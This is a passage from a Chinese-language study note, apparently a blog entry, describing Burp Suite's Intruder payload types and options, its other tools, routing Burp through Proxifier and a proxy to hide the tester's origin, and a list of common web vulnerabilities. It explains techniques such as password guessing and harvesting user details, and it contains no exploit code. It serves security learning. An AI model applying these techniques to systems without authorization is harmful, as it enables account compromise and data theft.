+<li>不合法的Unicode编码（Illegal Unicode）—— 在payloads里用指定的不合法Unicode 编码替换字符本身，从这些Payload列表里产生出一个或者多个有效负荷。在尝试回避基于模式匹配的输入验证时，这个有效负荷会有用的。</li>
+<li>字符块（Character blocks）——这种类型的Payload是指使用一个给出的输入字符串，根据指定的设置产生指定大小的字符块，表现形式为生成指定长度的字符串。它通常用于边界测试或缓冲区溢出。</li>
+<li>数字类型（Number）——这种类型的Payload是指根据配置，生成一系列的数字作为Payload。</li>
+<li>日期类型（Dates）——这种类型的Payload是指根据配置，生成一系列的日期。</li>
+<li>暴力字典（Brute forcer）——此类Payload生成包含一个指定的字符集的所有排列特定长度的有效载荷，通常用于枚举字典的生成。</li>
+<li>空类型（Null payloads）——这种负载类型产生的Payload，其值是一个空字符串。在攻击时，需要同样的请求反复被执行，在没有任何修改原始请求的场景下此Payload是非常有用的。</li>
+<li>字符frobber（Character frobber）——这种类型的Payload的生成规律是：依次修改指定字符串在每个字符位置的值，每次都是在原字符上递增一个该字符的ASCII码。</li>
+<li>Bit翻转（Bit flipper）——这种类型的Payload的生成规律是：对预设的Payload原始值，按照比特位，依次进行修改。</li>
+<li>用户名生成器（Username generator）这种类型的Payload主要用于用户名和email帐号的自动生成。</li>
+<li>ECB 加密块洗牌（ECB block shuffler）——这种类型的Payload是基于ECB加密模式的Payload生成器。</li>
+<li>Burp Payload生成插件（Extension-generated）——这种类型的Payload是基于Burp插件来生成Payload值，因此使用前必须安装配置Burp插件，在插件里注册一个Intruder payload生成器，供此处调用。</li>
+<li>Payload复制（Copy other payload）——这种类型的Payload是将其他位置的参数复制到Payload位置上，作为新的Payload值。</li>
+</ul>
+</li>
+<li>options可选设置：<ul>
+<li>请求消息头设置（Request Headers）——这个设置主要用来控制请求消息的头部信息，它由Update Content-Length header和Set Connection: close两个选项组成。其中Update Content-Length header如果被选中，Burp Intruder在每个请求添加或更新Content-Length头为该次请求的HTTP体的长度正确的值。这个功能通常是为插入可变长度的Payload到模板的HTTP请求的主体的攻击中，如果没有指定正确的值，则目标服务器可能会返回一个错误，可能会到一个不完整的请求做出响应，或者可能会无限期地等待请求继续接收数据。Set Connection: close如果被选中，表示Burp Intruder在每个请求消息中添加或更新值为“关闭”的连接头，这将更迅速地执行。</li>
+<li>请求引擎设置（Request Engine）——这个设置主要用来控制Burp Intruder攻击，包括线程什么的，用来提高效率。</li>
+<li>Grep Match——这个设置主要用来从响应消息中提取结果项，如果匹配，则在攻击结果中添加的新列中标明，便于排序和数据提取。比如说，在密码猜测攻击，扫描诸如“密码不正确”或“登录成功”，可以找到成功的登录;在测试SQL注入漏洞，扫描包含“ODBC”，“错误”等消息可以识别脆弱的参数。</li>
+<li>Grep Extract——这些设置可用于提取响应消息中的有用信息。对于列表中配置的每个项目，Burp会增加包含提取该项目的文本的新结果列。然后，您可以排序此列（通过单击列标题）命令所提取的数据。此选项是从应用数据挖掘有用的，能够支持广泛的攻击。例如，如果你是通过一系列文档ID的循环，可以提取每个文档寻找有趣的项目的页面标题。如果您发现返回的其他应用程序用户详细信息的功能，可以通过用户ID重复和检索有关用户寻找管理帐户，甚至密码。如果“遗忘密码”的功能需要一个用户名作为参数，有关用户寻找管理帐户，甚至密码。如果“遗忘密码”的功能需要一个用户名作为参数，并返回一个用户配置的密码提示，您可以通过共同的用户名列表运行和收获的所有相关密码的提示，然后直观地浏览列表寻找容易被猜到密码。</li>
+<li>Grep Payloads——这些设置可用于提取响应消息中是否包含Payload的值，比如说，你想验证反射性的XSS脚本是否成功，可以通过此设置此项。</li>
+<li>重定向（Redirections）——这些设置主要是用来控制执行攻击时Burp如何处理重定向。</li>
+</ul>
+</li>
+<li>至于结果，一般都是看返回数据长度来判别payload是否有效。</li>
+</ul>
+</li>
+<li>repeater 重放：进行反复测试。上传攻击用的比较多。request可以修改请求，两个框框下面可以匹配搜索关键字。</li>
+<li>decoder 解码器：解码用的。里面也有编码功能。</li>
+<li>comparer  比较器：比较两个请求数据包内容的改动。</li>
+<li>extender 扩展器：扩展插件功能。</li>
+<li>burp配合其他代理隐藏自身：本地请求—&gt;burp—&gt;proxifier—&gt;ss—&gt;目标站点。重点是proxifier的配置，通过代理规则让burp发出的数据包全部经过ss代理以后再发出，达到隐藏自身和翻墙的目的。</li>
+</ul>
+<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h2 id="有哪些"><a href="#有哪些" class="headerlink" title="有哪些"></a>有哪些</h2><ul>
+<li><p>OWASP TOP10</p>
+</li>
+<li><p>常见的：SQL注入，XSS，CSRF，SSRF，未授权访问，越权，命令执行，代码执行，弱口令…</p>
+<p>后面具体学习的时候每个点再深入</p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>多在实战中使用。</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>基础学习</tag>
+      </tags>
+  </entry>
+</search>
